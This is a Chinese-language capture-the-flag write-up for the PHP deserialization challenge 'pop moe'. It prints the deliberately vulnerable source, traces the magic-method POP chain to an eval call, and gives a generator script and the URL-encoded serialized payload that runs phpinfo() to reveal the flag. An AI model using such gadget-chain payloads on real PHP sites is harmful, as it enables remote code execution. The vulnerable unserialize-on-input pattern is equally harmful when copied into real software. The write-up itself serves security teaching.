---
title: "pop moe"
date: 2024-08-13
---
# pop moe

如果对**php反序列化漏洞**不了解，建议先看一下[PHP反序列化漏洞学习](https://www.bilibili.com/video/BV1R24y1r71C)前14节

## 题

```php
<?php

class class000 {
    private $payl0ad = 0;
    protected $what;

    public function __destruct()
    {
        $this->check();
    }

    public function check()
    {
        if($this->payl0ad === 0)
        {
            die('FAILED TO ATTACK');
        }
        $a = $this->what;
        $a();
    }
}

class class001 {
    public $payl0ad;
    public $a;
    public function __invoke()
    {
        $this->a->payload = $this->payl0ad;
    }
}

class class002 {
    private $sec;
    public function __set($a, $b)
    {
        $this->$b($this->sec);
    }

    public function dangerous($whaattt)
    {
        $whaattt->evvval($this->sec);
    }

}

class class003 {
    public $mystr;
    public function evvval($str)
    {
        eval($str);
    }

    public function __tostring()
    {
        return $this->mystr;
    }
}

if(isset($_GET['data']))
{
    $a = unserialize($_GET['data']);
}
else {
    highlight_file(__FILE__);
}
?>
```

## Magic methods

* `__tostring`  用调用`字符串`的方式调用`对象`
* `__set`  给不存在的成员属性赋值
* `__invoke`  调用对象作为函数
* `__destruct`  对象被销毁时调用

## 思路

序列号漏洞的思路是逆推

1. 执行`class003`的`evvval`方法，实现`eval($str);`
2. 调用`class002`的`dangerous`方法，传入`$this->sec`，实现`$whaattt->evvval($this->sec);`
3. 触发`class002`的`__set`方法，给不存在的成员属性赋值，实现`$this->$b($this->sec);`其中`$b`为`dangerous`方法，以此调用第2步的`dangerous`
4. 触发`class001`的`__invoke`方法，调用对象作为函数，将`public $a`变量设为`class002`对象，`$this->a->payload = $this->payl0ad;`给不存在的变量`payload`赋值，触发第3步的`class002__set`方法
5. 创建`class000`对象，`private $payl0ad`改一下绕过`check`方法，将`protected $what`设为`class001`对象，从而触发第4步的`class001__invoke`方法
6. 在这里用了`__construct`方法，将作为`$what`参数传递给`__construct`方法，然后该方法将这个值赋给对象的`$what`属性,从而绕过`protected`和`private`属性的访问限制

## 解题

大致思路有了，现在逆着操作一下

```php
<?php
class class000 {
    private $payl0ad = 1;//改一下绕过`check`方法
    protected $what;

    public function __construct($what) {
        $this->what = $what;//输入$what
    }
}

class class001 {
    public $payl0ad;
    public $a;

    public function __construct($a, $payl0ad) {
        $this->a = $a;
        $this->payl0ad = $payl0ad;
    }
}

class class002 {
    private $sec;

    public function __construct($sec) {
        $this->sec = $sec;
    }
}

class class003 {
    public $mystr;

    public function __construct($mystr) {
        $this->mystr = $mystr;
    }
}

$class003 = new class003('phpinfo();');
//$mystr设为'phpinfo();'，可以即使生效，看到phpinfo页面即成功

$class002 = new class002($class003);
//将$sec设为$class003对象
//将$class003对象作为字符串使用，从而触发__tostring方法返回$mystr
//效果相当于把$this->$b($this->sec);改成$this->$b($mystr);

$class001 = new class001($class002, 'dangerous');
//将$a设为$class002对象，$payl0ad设为'dangerous'
//目的是触发__invoke方法实现$this->a->payload = $this->payl0ad;
//从而触发上一步的__set方法

$class000 = new class000($class001);
//将$what设为$class001对象
//$a = $this->what;
//$a();将$class001对象作为函数
//从而触发上一步的__invoke方法


$payload = serialize($class000);

echo $payload;

echo PHP_EOL;//换行

$url = urlencode($payload);
echo $url;
?>
```

## payload

```php
O:8:"class000":2:{s:17:" class000 payl0ad";i:1;s:7:" * what";O:8:"class001":2:{s:7:"payl0ad";s:9:"dangerous";s:1:"a";O:8:"class002":1:{s:13:" class002 sec";O:8:"class003":1:{s:5:"mystr";s:10:"phpinfo();";}}}}
```

注意`private`和`protected`属性的属性名中有空格(原始数据中是`00`编码)
要用`%00`转义一下
或者可以直接让他输出url编码后的payload

完整payload:

```php
//完整payload:
?data=O:8:"class000":2:{s:17:"%00class000%00payl0ad";i:1;s:7:"%00*%00what";O:8:"class001":2:{s:7:"payl0ad";s:9:"dangerous";s:1:"a";O:8:"class002":1:{s:13:"%00class002%00sec";O:8:"class003":1:{s:5:"mystr";s:10:"phpinfo();";}}}}
//url编码:
?data=O%3A8%3A%22class000%22%3A2%3A%7Bs%3A17%3A%22%00class000%00payl0ad%22%3Bi%3A1%3Bs%3A7%3A%22%00%2A%00what%22%3BO%3A8%3A%22class001%22%3A2%3A%7Bs%3A7%3A%22payl0ad%22%3Bs%3A9%3A%22dangerous%22%3Bs%3A1%3A%22a%22%3BO%3A8%3A%22class002%22%3A1%3A%7Bs%3A13%3A%22%00class002%00sec%22%3BO%3A8%3A%22class003%22%3A1%3A%7Bs%3A5%3A%22mystr%22%3Bs%3A10%3A%22phpinfo%28%29%3B%22%3B%7D%7D%7D%7D
```

phpinfo页面搜索`moectf{`即可
